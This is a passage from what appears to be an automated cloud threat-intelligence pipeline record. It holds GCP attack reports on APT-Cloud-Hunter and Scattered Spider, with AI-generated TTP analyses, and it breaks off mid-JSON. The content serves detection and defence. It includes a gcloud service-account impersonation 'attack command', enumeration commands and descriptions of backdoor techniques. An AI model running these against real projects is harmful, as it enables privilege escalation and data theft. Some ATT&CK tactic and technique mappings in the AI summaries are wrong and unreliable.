{
  "cti_content": "Loaded 2 CTI files (~3,785 tokens)\nFiles chunked/summarized: 1\nRemaining token budget for analysis: ~1,044,791 tokens\n================================================================================\n\n================================================================================\nFILE: sample-gcp-threats.md\n================================================================================\n# GCP IAM Privilege Escalation Campaign - APT-Cloud-Hunter\n\n## Executive Summary\nAdvanced threat actor APT-Cloud-Hunter has been observed targeting Google Cloud Platform (GCP) environments with sophisticated privilege escalation techniques focused on IAM service account abuse.\n\n## Threat Actor Profile\n- **Name:** APT-Cloud-Hunter\n- **Aliases:** CloudStrike, GCP-Shadow\n- **Motivation:** Espionage, data theft\n- **Sophistication:** High\n- **First Observed:** 2024-Q2\n- **Targets:** Cloud-native organizations, SaaS providers, financial services\n\n## Attack Chain\n\n### 1. Initial Access (T1078.004 - Valid Accounts: Cloud Accounts)\n- Compromised service account credentials via phishing or credential stuffing\n- Exploited misconfigured Cloud Storage buckets containing service account keys\n- Target: Low-privilege service accounts in development projects\n\n### 2. Discovery (T1087.004 - Account Discovery: Cloud Account)\n- Enumerate IAM policies: `gcloud projects get-iam-policy`\n- List service accounts: `gcloud iam service-accounts list`\n- Identify high-privilege service accounts with `roles/iam.serviceAccountTokenCreator`\n\n### 3. Privilege Escalation (T1550.001 - Use Alternate Authentication Material)\n**Primary TTP: Service Account Impersonation**\n- Use `GenerateAccessToken` API to impersonate high-privilege service accounts\n- Target accounts with `roles/owner`, `roles/editor`, or custom admin roles\n- Bypass MFA by using service account tokens instead of user accounts\n\n**GCP API Calls Observed:**\n```\niam.serviceAccounts.getAccessToken\niam.serviceAccounts.implicitDelegation\niam.serviceAccounts.generateAccessToken\n```\n\n**Example Attack Command:**\n```bash\ngcloud iam service-accounts generate-access-token \\\n  highly-privileged-sa@project.iam.gserviceaccount.com \\\n  --impersonate-service-account=victim-sa@project.iam.gserviceaccount.com\n```\n\n### 4. Lateral Movement (T1021.007 - Cloud Services)\n- Use elevated privileges to access other GCP projects\n- Modify IAM policies to grant persistent access\n- Create new service accounts as backdoors\n\n### 5. Data Exfiltration (T1567.002 - Cloud Storage)\n- Export BigQuery datasets to attacker-controlled Cloud Storage buckets\n- Download sensitive files from Cloud Storage\n- Exfiltrate data via Cloud Functions with outbound internet access\n\n## Key Indicators of Compromise (IOCs)\n\n### GCP Audit Log Patterns\n1. **Unusual GenerateAccessToken API calls:**\n   - `protoPayload.methodName: \"GenerateAccessToken\"`\n   - `protoPayload.authenticationInfo.principalEmail` does NOT end with `.gserviceaccount.com`\n   - Multiple calls within short timeframe (5+ within 10 minutes)\n\n2. **Service Account Impersonation from External Users:**\n   - User account (not service account) calling `iam.serviceAccounts.implicitDelegation`\n   - Source IP outside normal GCP IP ranges\n   - Off-hours activity (outside business hours)\n\n3. **IAM Policy Modifications:**\n   - `SetIamPolicy` calls adding `roles/iam.serviceAccountTokenCreator`\n   - Binding modifications granting `roles/owner` to new principals\n   - Policy changes from non-admin accounts\n\n4. **Suspicious BigQuery Data Access:**\n   - Large dataset exports (>10GB) to external storage\n   - `bigquery.datasets.export` to non-organizational buckets\n   - Unusual query patterns accessing sensitive tables\n\n## Detection Opportunities\n\n### High-Priority Detections\n\n**1. External User Service Account Impersonation**\n- **Log Source:** GCP Audit Logs (Admin Activity)\n- **Detection Logic:**\n  - `serviceName = \"iam.googleapis.com\"`\n  - `methodName = \"GenerateAccessToken\"`\n  - `authenticationInfo.principalEmail` NOT like `%@%.gserviceaccount.com`\n- **False Positive Risk:** LOW (legitimate use rare)\n- **Severity:** HIGH\n\n**2. Excessive Service Account Token Generation**\n- **Log Source:** GCP Audit Logs (Admin Activity)\n- **Detection Logic:**\n  - Count `GenerateAccessToken` calls per principal\n  - Threshold: >5 calls in 10 minutes\n  - Group by `authenticationInfo.principalEmail`\n- **False Positive Risk:** MEDIUM (CI/CD pipelines may trigger)\n- **Severity:** MEDIUM\n\n**3. Off-Hours IAM Policy Modifications**\n- **Log Source:** GCP Audit Logs (Admin Activity)\n- **Detection Logic:**\n  - `methodName = \"SetIamPolicy\"`\n  - Timestamp outside business hours (e.g., 00:00-06:00 UTC)\n  - Excludes automated service accounts\n- **False Positive Risk:** MEDIUM (on-call engineers, global teams)\n- **Severity:** HIGH\n\n**4. Service Account Privilege Escalation**\n- **Log Source:** GCP Audit Logs (Admin Activity)\n- **Detection Logic:**\n  - `methodName = \"SetIamPolicy\"`\n  - `request.policy.bindings` contains `roles/iam.serviceAccountTokenCreator`\n  - `request.policy.bindings` contains `roles/owner` OR `roles/editor`\n- **False Positive Risk:** LOW\n- **Severity:** CRITICAL\n\n## Defensive Recommendations\n\n1. **IAM Policy Hardening:**\n   - Restrict `roles/iam.serviceAccountTokenCreator` to trusted principals only\n   - Implement organization policy constraint: `iam.disableServiceAccountKeyCreation`\n   - Use short-lived tokens (Workload Identity Federation)\n\n2. **Monitoring & Alerting:**\n   - Enable Cloud Audit Logs for all GCP services\n   - Forward logs to SIEM (Chronicle, Splunk, ELK)\n   - Implement detections outlined above\n\n3. **Access Controls:**\n   - Enforce VPC Service Controls to restrict service account usage\n   - Require MFA for all human users\n   - Separate dev/staging/prod projects with strict IAM boundaries\n\n## MITRE ATT&CK Mapping\n\n| Tactic | Technique | ID | GCP Context |\n|--------|-----------|-----|-------------|\n| Initial Access | Valid Accounts: Cloud Accounts | T1078.004 | Compromised service account credentials |\n| Discovery | Account Discovery: Cloud Account | T1087.004 | Enumerate IAM policies and service accounts |\n| Privilege Escalation | Use Alternate Authentication Material | T1550.001 | Service account impersonation via GenerateAccessToken |\n| Persistence | Account Manipulation | T1098.001 | Create backdoor service accounts |\n| Lateral Movement | Remote Services: Cloud Services | T1021.007 | Access other GCP projects |\n| Exfiltration | Transfer Data to Cloud Account | T1537 | Export BigQuery data to attacker-controlled storage |\n\n## References\n- [GCP IAM Service Account Documentation](https://cloud.google.com/iam/docs/service-accounts)\n- [GCP Audit Logs Reference](https://cloud.google.com/logging/docs/audit)\n- [MITRE ATT&CK for Cloud](https://attack.mitre.org/matrices/enterprise/cloud/)\n- [Service Account Impersonation Best Practices](https://cloud.google.com/iam/docs/impersonating-service-accounts)\n\n## Appendix: Sample GCP Audit Log\n\n```json\n{\n  \"protoPayload\": {\n    \"serviceName\": \"iam.googleapis.com\",\n    \"methodName\": \"GenerateAccessToken\",\n    \"authenticationInfo\": {\n      \"principalEmail\": \"attacker@external-domain.com\"\n    },\n    \"requestMetadata\": {\n      \"callerIp\": \"203.0.113.42\"\n    },\n    \"request\": {\n      \"name\": \"projects/-/serviceAccounts/admin-sa@victim-project.iam.gserviceaccount.com\",\n      \"delegates\": [],\n      \"scope\": [\"https://www.googleapis.com/auth/cloud-platform\"]\n    },\n    \"response\": {\n      \"accessToken\": \"[REDACTED]\",\n      \"expireTime\": \"2024-12-25T13:00:00Z\"\n    }\n  },\n  \"resource\": {\n    \"type\": \"service_account\",\n    \"labels\": {\n      \"project_id\": \"victim-project\",\n      \"unique_id\": \"112233445566778899\"\n    }\n  },\n  \"timestamp\": \"2024-12-25T12:00:00Z\",\n  \"severity\": \"NOTICE\"\n}\n```\n\n---\n\n**Report Date:** 2024-12-25  \n**Analyst:** Threat Intelligence Team  \n**Classification:** CONFIDENTIAL\n\n================================================================================\nFILE: wiz-Scattered Spider targeting GCP environment.pdf (CHUNKED SUMMARY)\n================================================================================\n--- Chunk 1/1 ---\nHere's the extracted threat intelligence from the provided CTI document chunk:\n\n---\n\n## Extracted Threat Intelligence: Scattered Spider Targeting GCP Environment\n\n**1. Threat Actors/Groups**\n*   **Scattered Spider:** The primary threat group identified as actively targeting GCP environments. Known for sophisticated social engineering and financially motivated attacks.\n*   **Oktapus:** Listed as an actor. Oktapus (also known as \"0ktapus\" or \"MFA Bombing\") is a credential phishing campaign known for targeting organizations to steal MFA tokens and login credentials, often associated with Scattered Spider for initial access.\n\n**2. TTPs and MITRE ATT&CK Techniques**\n\nThe document details the following \"Observed techniques\":\n\n*   **Create or modify firewall or security group rules**\n    *   **MITRE ATT&CK (Cloud):**\n        *   **TA0008 - Defense Evasion:** T1562.007 - Impair Defenses: Disable or Modify Cloud Firewall.\n        *   **TA0005 - Command and Control:** T1090 - Proxy (e.g., opening specific ports for C2 traffic).\n        *   **TA0003 - Persistence:** Allowing continued access.\n    *   **Technical Details:** Adversaries manipulate network access controls within GCP (e.g., GCP Firewall Rules) to enable lateral movement, establish C2 channels, exfiltrate data, or block legitimate security monitoring/access.\n\n*   **OS password reset**\n    *   **MITRE ATT&CK (Cloud):**\n        *   **TA0006 - Credential Access:** T1098.001 - Account Manipulation: Additional Cloud Roles/Permissions (if leveraging cloud console/API to reset OS user passwords on instances).\n        *   **TA0003 - Persistence:** T1098.003 - Account Manipulation: Additional Cloud Accounts (creating new users or resetting existing ones to ensure persistent access to Compute Engine instances).\n    *   **Technical Details:** Gaining administrative access to a compromised GCP project allows attackers to reset operating system passwords for users on Compute Engine virtual machines, ensuring persistent access.\n\n*   **Create SSH backdoor**\n    *   **MITRE ATT&CK (Cloud):**\n        *   **TA0003 - Persistence:** T1098.004 - Account Manipulation: SSH Authorized Keys.\n        *   **TA0008 - Defense Evasion:** Establishing covert access channels.\n    *   **Technical Details:** Attackers add their own SSH public keys to the `authorized_keys` file on compromised Compute Engine instances, or leverage GCP's project/instance-level SSH key management, enabling persistent, unauthenticated SSH access.\n\n*   **Modify compute startup script**\n    *   **MITRE ATT&CK (Cloud):**\n        *   **TA0003 - Persistence:** T1053.007 - Boot or Login Autostart Execution: Modify Cloud Instance Metadata (specific to GCP Compute Engine startup scripts).\n        *   **TA0002 - Execution:** Executing arbitrary commands on instance boot.\n        *   **TA0005 - Command and Control:** Establishing C2 upon reboot.\n    *   **Technical Details:** Attackers modify the metadata `startup-script` or `windows-startup-script-url` properties of GCP Compute Engine instances. This script executes automatically every time the VM starts or reboots, providing a highly persistent mechanism for malware deployment, C2 establishment, or backdooring.\n\n*   **Launch new cloud resources**\n    *   **MITRE ATT&CK (Cloud):**\n        *   **TA0002 - Execution:** T1047 - Windows Management Instrumentation (analogous to cloud API calls for resource creation).\n        *   **TA0003 - Persistence:** Creating new infrastructure for continued operations.\n        *   **TA0005 - Command and Control:** Launching C2 servers or proxy infrastructure.\n        *   **TA0009 - Collection / TA0010 - Exfiltration:** Launching resources for data staging or exfiltration.\n    *   **Technical Details:** Using compromised cloud credentials, attackers provision new GCP resources (e.g., additional Compute Engine VMs, Cloud Storage buckets, networking components) for various purposes such as establishing new C2 infrastructure, staging exfiltrated data, creating shadow IT, or expanding their foothold.\n\n*   **Delete compute snapshot**\n    *   **MITRE ATT&CK (Cloud):**\n        *   **TA0007 - Impact:** T1498 - Deny Access to Resource (specifically, denial of restoration capability).\n        *   **TA0008 - Defense Evasion:** T1562.001 - Impair Defenses: Disable or Modify Tools (hindering recovery efforts).\n    *   **Technical Details:** Attackers delete GCP Compute Engine disk snapshots. This is a critical step often taken before or during ransomware deployment (`RansomOp` impact) to prevent victims from restoring their systems from backups and increase pressure for ransom payment.\n\n**3. IOCs (Indicators of Compromise)**\n\n*   **URLs (References, not necessarily malicious IOCs):**\n    *   `https://www.youtube.com/watch?v=H0CmqRCx...` (Incomplete URL, listed under \"References\")\n    *   `https://threats.wiz.io/all-incidents/scattered-spider-targeting-gcp-environment` (Reference URL to the CTI document itself)\n\n    *Note: The document does not provide specific malicious IP addresses, domains, hashes, or file paths.*\n\n**4. GCP/Cloud-Specific Details**\n\n*   **Target Environment:** Explicitly \"GCP environment.\"\n*   **Cloud Service Focus:** Primarily GCP Compute Engine (implied by \"compute startup script,\" \"compute snapshot,\" \"OS password reset,\" \"Create SSH backdoor,\" \"firewall or security group rules\").\n*   **GCP-Specific Actions:**\n    *   Manipulation of GCP Firewall Rules.\n    *   Modification of GCP Compute Engine instance metadata (specifically `startup-script`).\n    *   Launching of new GCP cloud resources.\n    *   Deletion of GCP Compute Engine disk snapshots.\n    *   OS password resets on GCP Compute Engine instances, likely via cloud APIs or console.\n\n**5. Attack Chains and Procedures**\n\n*   **Initial Access:** **Unknown.** The document explicitly states \"Initial access: Unknown.\" However, given Oktapus is listed as an actor, it's highly probable that social engineering and credential phishing (e.g., MFA bombing) were involved to gain initial access to GCP credentials.\n*   **Post-Compromise Activities:**\n    1.  **Persistence & Evasion:** Adversaries establish persistent access by creating **SSH backdoors** on Compute Engine instances and performing **OS password resets** to secure accounts. They modify **compute startup scripts** to ensure malicious code execution upon reboot, maintaining their presence even after reboots.\n    2.  **Lateral Movement/C2/Network Manipulation:** Attackers manipulate GCP **firewall or security group rules** to open ingress/egress for command and control (C2) communication, enable lateral movement within the GCP environment, or block legitimate security controls.\n    3.  **Resource Manipulation/Expansion:** Attackers **launch new cloud resources** (e.g., additional VMs, storage) to expand their foothold, set up new C2 infrastructure, stage data for exfiltration, or deploy additional malicious tools.\n    4.  **Impact / Denial of Recovery:** To maximize impact and hinder recovery, the attackers **delete compute snapshots** associated with compromised Compute Engine disks. This action directly supports the ultimate impact of \"RansomOp\" by destroying recovery points.\n*   **Impact:** The ultimate impact observed is **RansomOp**, indicating the deployment of ransomware or data encryption/destruction for extortion purposes, leveraging the deletion of snapshots to enhance impact.\n\n",
  "timestamp": "2026-02-07T23:44:01.066230",
  "cti_analysis": "[Event(model_version='gemini-2.5-pro', content=Content(\n  parts=[\n    Part(\n      text=\"\"\"{\n    \"threat_summary\": \"This report synthesizes intelligence on two distinct threat actors targeting Google Cloud Platform (GCP). The first, APT-Cloud-Hunter, is a high-sophistication espionage group focused on IAM privilege escalation. They gain initial access via compromised service account keys, then exploit the `iam.serviceAccountTokenCreator` role to impersonate high-privilege accounts, leading to lateral movement across projects and data exfiltration from BigQuery and Cloud Storage. The second actor, Scattered Spider, is a financially motivated group leveraging sophisticated social engineering for initial access, often associated with the Oktapus credential phishing campaign. In GCP, they focus on persistence and impact within Compute Engine by creating SSH backdoors, modifying startup scripts, and manipulating firewall rules. Their ultimate objective is ransomware deployment, which is amplified by deleting compute snapshots to prevent victim recovery. Both campaigns highlight the criticality of securing IAM configurations and monitoring both API-level and instance-level activity within GCP.\",\n    \"threat_actors\": [\n        {\n            \"name\": \"APT-Cloud-Hunter\",\n            \"aliases\": [\n                \"CloudStrike\",\n                \"GCP-Shadow\"\n            ],\n            \"motivation\": \"Espionage, data theft\",\n            \"sophistication\": \"High\",\n            \"targets\": [\n                \"Cloud-native organizations\",\n                \"SaaS providers\",\n                \"financial services\"\n            ]\n        },\n        {\n            \"name\": \"Scattered Spider\",\n            \"aliases\": [\n                \"Oktapus (associated campaign)\"\n            ],\n            \"motivation\": \"Financial\",\n            \"sophistication\": \"High (in social engineering)\",\n            \"targets\": [\n                \"GCP environments\"\n            ]\n        }\n    ],\n    \"objectives\": [\n        \"Privilege Escalation\",\n        \"Data Theft\",\n        \"Espionage\",\n        \"Persistence\",\n        \"Lateral Movement\",\n        \"Command and Control\",\n        \"Financial Gain (Ransomware)\",\n        \"Impact / Denial of Recovery\"\n    ],\n    \"attack_vectors\": [\n        \"Compromised service account credentials via phishing or credential stuffing\",\n        \"Exploitation of misconfigured Cloud Storage buckets containing service account keys\",\n        \"Social Engineering\",\n        \"Credential Phishing (MFA Bombing)\"\n    ],\n    \"ttps\": [\n        {\n            \"ttp_id\": \"T1550.001\",\n            \"ttp_name\": \"Service Account Impersonation\",\n            \"tactic\": \"Privilege Escalation\",\n            \"description\": \"An attacker with specific permissions uses them to generate temporary credentials for a cloud service account, effectively assuming its identity and permissions.\",\n            \"gcp_relevance\": \"This is a primary privilege escalation vector in GCP. Attackers with the `iam.serviceAccountTokenCreator` role use the `iam.serviceAccounts.generateAccessToken` API to impersonate a higher-privileged service account, bypassing MFA and gaining elevated access, often to Owner or Editor roles.\",\n            \"priority\": \"CRITICAL\",\n            \"evidence\": [\n                \"Use `GenerateAccessToken` API to impersonate high-privilege service accounts\",\n                \"Target accounts with `roles/owner`, `roles/editor`, or custom admin roles\",\n                \"Bypass MFA by using service account tokens instead of user accounts\"\n            ]\n        },\n        {\n            \"ttp_id\": \"T1053.007\",\n            \"ttp_name\": \"Modify Compute Startup Script\",\n            \"tactic\": \"Persistence\",\n            \"description\": \"Attackers modify the startup script metadata of a cloud instance. This script automatically executes with elevated privileges every time the instance boots, providing a powerful persistence mechanism.\",\n            \"gcp_relevance\": \"Attackers modify the `startup-script` metadata key for GCP Compute Engine instances. This ensures their malicious code (e.g., for C2 or malware deployment) is executed each time the VM starts or reboots.\",\n            \"priority\": \"HIGH\",\n            \"evidence\": [\n                \"Attackers modify the metadata `startup-script` or `windows-startup-script-url` properties of GCP Compute Engine instances. This script executes automatically every time the VM starts or reboots, providing a highly persistent mechanism...\"\n            ]\n        },\n        {\n            \"ttp_id\": \"T1098.004\",\n            \"ttp_name\": \"Create SSH Backdoor via Metadata\",\n            \"tactic\": \"Persistence\",\n            \"description\": \"An attacker injects their own SSH public key into a system's configuration, allowing for persistent and often passwordless remote access.\",\n            \"gcp_relevance\": \"In GCP, attackers add their SSH public keys to project or instance-level metadata for Compute Engine instances. This grants them persistent SSH access to the virtual machine without needing a password, bypassing other authentication controls.\",\n            \"priority\": \"HIGH\",\n            \"evidence\": [\n                \"Attackers add their own SSH public keys to the `authorized_keys` file on compromised Compute Engine instances, or leverage GCP's project/instance-level SSH key management, enabling persistent, unauthenticated SSH access.\"\n            ]\n        },\n        {\n            \"ttp_id\": \"T1489\",\n            \"ttp_name\": \"Delete Cloud Backups\",\n            \"tactic\": \"Impact\",\n            \"description\": \"Attackers delete system backups or snapshots to prevent recovery from a destructive event, such as a ransomware attack. This increases pressure on the victim to pay the ransom.\",\n            \"gcp_relevance\": \"In GCP, attackers delete Compute Engine disk snapshots. This is a destructive action to hinder recovery efforts, often performed just before deploying ransomware to ensure the victim cannot easily restore their systems.\",\n            \"priority\": \"HIGH\",\n            \"evidence\": [\n                \"Delete compute snapshot\",\n                \"Attackers delete GCP Compute Engine disk snapshots. This is a critical step often taken before or during ransomware deployment (`RansomOp` impact) to prevent victims from restoring their systems from backups...\"\n            ]\n        },\n        {\n            \"ttp_id\": \"T1098.001\",\n            \"ttp_name\": \"Create Backdoor Service Account\",\n            \"tactic\": \"Persistence\",\n            \"description\": \"Adversaries create new accounts in the environment to maintain access to victim systems.\",\n            \"gcp_relevance\": \"After escalating privileges, APT-Cloud-Hunter creates new, attacker-controlled service accounts within the victim's GCP project to serve as backdoors for long-term access.\",\n            \"priority\": \"HIGH\",\n            \"evidence\": [\n                \"Create new service accounts as backdoors\"\n            ]\n        },\n        {\n            \"ttp_id\": \"T1021.007\",\n            \"ttp_name\": \"Access Other Cloud Projects\",\n            \"tactic\": \"Lateral Movement\",\n            \"description\": \"Adversaries use credentials and permissions gained in one cloud resource to access other resources or services within the same or different cloud accounts.\",\n            \"gcp_relevance\": \"Using tokens from impersonated high-privilege service accounts, APT-Cloud-Hunter accesses other GCP projects within the organization that the compromised account has permissions to.\",\n            \"priority\": \"MEDIUM\",\n            \"evidence\": [\n                \"Use elevated privileges to access other GCP projects\"\n            ]\n        },\n        {\n            \"ttp_id\": \"T1562.007\",\n            \"ttp_name\": \"Modify Cloud Firewall Rules\",\n            \"tactic\": \"Defense Evasion\",\n            \"description\": \"Adversaries manipulate cloud firewall rules to allow malicious traffic, exfiltrate data, or block access for security tools and responders.\",\n            \"gcp_relevance\": \"Scattered Spider modifies GCP Firewall Rules to open ports for C2 channels, enable lateral movement within the GCP network, or permit data exfiltration to external endpoints.\",\n            \"priority\": \"MEDIUM\",\n            \"evidence\": [\n                \"Adversaries manipulate network access controls within GCP (e.g., GCP Firewall Rules) to enable lateral movement, establish C2 channels, exfiltrate data, or block legitimate security monitoring/access.\"\n            ]\n        },\n        {\n            \"ttp_id\": \"T1087.004\",\n            \"ttp_name\": \"Cloud Account Discovery\",\n            \"tactic\": \"Discovery\",\n            \"description\": \"Once inside a cloud environment, an attacker enumerates accounts, roles, and permissions to understand the environment and identify targets for privilege escalation.\",\n            \"gcp_relevance\": \"APT-Cloud-Hunter uses gcloud commands like `gcloud projects get-iam-policy` and `gcloud iam service-accounts list` to map out IAM permissions and find service accounts with valuable roles, such as `roles/iam.serviceAccountTokenCreator`.\",\n            \"priority\": \"MEDIUM\",\n            \"evidence\": [\n                \"Enumerate IAM policies: `gcloud projects get-iam-policy`\",\n                \"List service accounts: `gcloud iam service-accounts list`\"\n            ]\n        },\n        {\n            \"ttp_id\": \"T1648\",\n            \"ttp_name\": \"Launch New Cloud Resources\",\n            \"tactic\": \"Resource Development\",\n            \"description\": \"Adversaries provision new resources in a compromised cloud environment to support their operations, such as for command and control or data staging.\",\n            \"gcp_relevance\": \"Scattered Spider uses compromised credentials to provision new GCP resources, such as Compute Engine VMs and Cloud Storage buckets, to expand their foothold, host C2 infrastructure, or stage data for exfiltration.\",\n            \"priority\": \"LOW\",\n            \"evidence\": [\n                \"Using compromised cloud credentials, attackers provision new GCP resources (e.g., additional Compute Engine VMs, Cloud Storage buckets, networking components) for various purposes...\"\n            ]\n        },\n        {\n            \"ttp_id\": \"T1537\",\n            \"ttp_name\": \"Transfer Data to Cloud Account\",\n            \"tactic\": \"Exfiltration\",\n            \"description\": \"Attackers exfiltrate data by transferring it from the victim's cloud environment to a cloud storage service under their own control.\",\n            \"gcp_relevance\": \"APT-Cloud-Hunter was observed exporting large BigQuery datasets and other sensitive files from Cloud Storage buckets directly to attacker-controlled Cloud Storage buckets.\",\n            \"priority\": \"HIGH\",\n            \"evidence\": [\n                \"Export BigQuery datasets to attacker-controlled Cloud Storage buckets\",\n                \"Download sensitive files from Cloud Storage\"\n            ]\n        }\n    ],\n    \"gcp_services_targeted\": [\n        \"IAM\",\n        \"Compute Engine\",\n        \"Cloud Storage\",\n        \"BigQuery\",\n        \"GCP Firewall\",\n        \"Cloud Functions\"\n    ],\n    \"key_indicators\": [\n        \"API Call: `iam.serviceAccounts.generateAccessToken` from a user principal (not a service account).\",\n        \"API Call: `iam.serviceAccounts.implicitDelegation` from a user principal.\",\n        \"High frequency of `GenerateAccessToken` calls from a single principal (>5 calls in 10 minutes).\",\n        \"API Call: `SetIamPolicy` adding sensitive roles like `roles/iam.serviceAccountTokenCreator`, `roles/owner`, or `roles/editor`.\",\n        \"Anomalous `SetIamPolicy` calls occurring outside of normal business hours.\",\n        \"API Call: `bigquery.datasets.export` to an external or non-organizational GCP project/bucket.\",\n        \"Modification of GCP Firewall Rules from a non-admin account or to allow broad ingress/egress (e.g., 0.0.0.0/0).\",\n        \"Addition of unknown SSH keys to Compute Engine project or instance metadata.\",\n        \"Modification of Compute Engine `startup-script` or `windows-startup-script-url` metadata.\",\n        \"Deletion of multiple Compute Engine disk snapshots.\",\n        \"Creation of new service accounts by non-administrator principals.\",\n        \"gcloud command line usage: `gcloud projects get-iam-policy`, `gcloud iam service-accounts list`.\"\n    ],\n    \"research_references\": [\n        \"https://cloud.google.com/iam/docs/service-accounts\",\n        \"https://cloud.google.com/logging/docs/audit\",\n        \"https://attack.mitre.org/matrices/enterprise/cloud/\",\n        \"https://cloud.google.com/iam/docs/impersonating-service-accounts\",\n        \"https://threats.wiz.io/all-incidents/scattered-spider-targeting-gcp-environment\"\n    ]\n}\"\"\"\n    ),\n  ],\n  role='model'\n), grounding_metadata=None, partial=None, turn_complete=None, finish_reason=<FinishReason.STOP: 'STOP'>, error_code=None, error_message=None, interrupted=None, custom_metadata=None, usage_metadata=GenerateContentResponseUsageMetadata(\n  candidates_token_count=2795,\n  candidates_tokens_details=[\n    ModalityTokenCount(\n      modality=<MediaModality.TEXT: 'TEXT'>,\n      token_count=2795\n    ),\n  ],\n  prompt_token_count=10875,\n  prompt_tokens_details=[\n    ModalityTokenCount(\n      modality=<MediaModality.TEXT: 'TEXT'>,\n      token_count=10875\n    ),\n  ],\n  thoughts_token_count=1078,\n  total_token_count=14748,\n  traffic_type=<TrafficType.ON_DEMAND: 'ON_DEMAND'>\n), live_session_resumption_update=None, input_transcription=None, output_transcription=None, avg_logprobs=-0.1707649462977974, logprobs_result=None, cache_metadata=None, citation_metadata=None, interaction_id=None, invocation_id='e-22bde99d-a3aa-455e-8b23-62aadbd6f522', author='cti_analyzer', actions=EventActions(skip_summarization=None, state_delta={}, artifact_delta={}, transfer_to_agent=None, escalate=None, requested_auth_configs={}, requested_tool_confirmations={}, compaction=None, end_of_agent=None, agent_state=None, rewind_before_invocation_id=None), long_running_tool_ids=None, branch=None, id='0048c877-c4d6-4221-8c40-3db154a59a3a', timestamp=1770507877.910609)]",
  "ttp_mapping": "[Event(model_version='gemini-2.5-pro', content=Content(\n  parts=[\n    Part(\n      text=\"\"\"{\n  \"ttps\": [\n    {\n      \"ttp_id\": \"T1550.001\",\n      \"ttp_name\": \"Use Alternate Authentication Material: Application Access Token\",\n      \"tactic\": \"Privilege Escalation\",\n      \"description\": \"An attacker with specific IAM permissions generates temporary credentials for a cloud service account to assume its identity and permissions, bypassing normal user authentication like MFA.\",\n      \"gcp_relevance\": \"This is a primary privilege escalation vector in GCP. Attackers with the `iam.serviceAccountTokenCreator` role call the `iam.serviceAccounts.generateAccessToken` API method to impersonate a higher-privileged service account. This bypasses MFA and grants elevated access (e.g., to Owner or Editor roles). Monitoring Cloud Audit Logs for this API call, especially when initiated by a user account, is a key detection strategy.\",\n      \"priority\": \"HIGH\",\n      \"evidence\": [\n        \"Use `GenerateAccessToken` API to impersonate high-privilege service accounts\",\n        \"Target accounts with `roles/owner`, `roles/editor`, or custom admin roles\"\n      ]\n    },\n    {\n      \"ttp_id\": \"T1136.003\",\n      \"ttp_name\": \"Create Account: Cloud Account\",\n      \"tactic\": \"Persistence\",\n      \"description\": \"After gaining sufficient privileges, an adversary creates a new, attacker-controlled account within the victim's cloud environment to serve as a backdoor for long-term access.\",\n      \"gcp_relevance\": \"After escalating privileges, an attacker calls the `iam.serviceAccounts.create` API method to create a new service account. This new account, which they control the keys for, provides a persistent backdoor that is less likely to be discovered than a compromised user account.\",\n      \"priority\": \"HIGH\",\n      \"evidence\": [\n        \"Create new service accounts as backdoors\"\n      ]\n    },\n    {\n      \"ttp_id\": \"T1098.004\",\n      \"ttp_name\": \"Account Manipulation: SSH Authorized Keys\",\n      \"tactic\": \"Persistence\",\n      \"description\": \"An attacker injects their own SSH public key into instance or project configuration, allowing for persistent and often passwordless remote access to virtual machines.\",\n      \"gcp_relevance\": \"In GCP, attackers with `compute.projects.setCommonInstanceMetadata` or `compute.instances.setMetadata` permissions add their SSH public keys to project-level or instance-level metadata. This grants them persistent SSH access to associated Compute Engine instances, bypassing other authentication controls.\",\n      \"priority\": \"HIGH\",\n      \"evidence\": [\n        \"Attackers add their own SSH public keys to the `authorized_keys` file on compromised Compute Engine instances, or leverage GCP's project/instance-level SSH key management, enabling persistent, unauthenticated SSH access.\"\n      ]\n    },\n    {\n      \"ttp_id\": \"T1537\",\n      \"ttp_name\": \"Transfer Data to Cloud Account\",\n      \"tactic\": \"Exfiltration\",\n      \"description\": \"Attackers exfiltrate data by transferring it from the victim's cloud environment (e.g., storage buckets, databases) to a cloud storage service under their own control.\",\n      \"gcp_relevance\": \"APT-Cloud-Hunter was observed exporting large BigQuery datasets (via `bigquery.datasets.export` jobs) and copying sensitive files from Cloud Storage buckets directly to an attacker-controlled Cloud Storage bucket in a different GCP project.\",\n      \"priority\": \"HIGH\",\n      \"evidence\": [\n        \"Export BigQuery datasets to attacker-controlled Cloud Storage buckets\",\n        \"Download sensitive files from Cloud Storage\"\n      ]\n    },\n    {\n      \"ttp_id\": \"T1490\",\n      \"ttp_name\": \"Inhibit System Recovery\",\n      \"tactic\": \"Impact\",\n      \"description\": \"Attackers delete system backups or snapshots to prevent recovery from a destructive event, such as a ransomware attack, thereby increasing pressure on the victim.\",\n      \"gcp_relevance\": \"In GCP, attackers call the `compute.snapshots.delete` API method to delete Compute Engine disk snapshots. This is a destructive action to hinder recovery efforts, often performed just before deploying ransomware to ensure the victim cannot easily restore their systems.\",\n      \"priority\": \"HIGH\",\n      \"evidence\": [\n        \"Delete compute snapshot\",\n        \"Attackers delete GCP Compute Engine disk snapshots. This is a critical step often taken before or during ransomware deployment (`RansomOp` impact) to prevent victims from restoring their systems from backups...\"\n      ]\n    },\n    {\n      \"ttp_id\": \"T1053.007\",\n      \"ttp_name\": \"Scheduled Task/Job: Cloud Scheduled Task\",\n      \"tactic\": \"Persistence\",\n      \"description\": \"Attackers modify or create scheduled tasks within a cloud environment to execute malicious code. This technique includes modifying cloud instance startup scripts.\",\n      \"gcp_relevance\": \"Attackers with `compute.instances.setMetadata` permissions modify the `startup-script` metadata key for a GCP Compute Engine instance. This ensures their malicious code (e.g., for C2 or malware deployment) is executed as root (on Linux) or System (on Windows) each time the VM starts or reboots, establishing persistence.\",\n      \"priority\": \"HIGH\",\n      \"evidence\": [\n        \"Attackers modify the metadata `startup-script` or `windows-startup-script-url` properties of GCP Compute Engine instances. This script executes automatically every time the VM starts or reboots, providing a highly persistent mechanism...\"\n      ]\n    },\n    {\n      \"ttp_id\": \"T1562.007\",\n      \"ttp_name\": \"Impair Defenses: Disable or Modify Cloud Firewall\",\n      \"tactic\": \"Defense Evasion\",\n      \"description\": \"Adversaries manipulate cloud firewall rules to allow malicious traffic, exfiltrate data, or block access for security tools and responders.\",\n      \"gcp_relevance\": \"Scattered Spider modifies GCP Firewall Rules (via API calls like `compute.firewalls.patch` or `compute.firewalls.insert`) to open ports for C2, enable lateral movement, or permit data exfiltration by creating permissive ingress/egress rules (e.g., allow all traffic to 0.0.0.0/0).\",\n      \"priority\": \"MEDIUM\",\n      \"evidence\": [\n        \"Adversaries manipulate network access controls within GCP (e.g., GCP Firewall Rules) to enable lateral movement, establish C2 channels, exfiltrate data, or block legitimate security monitoring/access.\"\n      ]\n    },\n    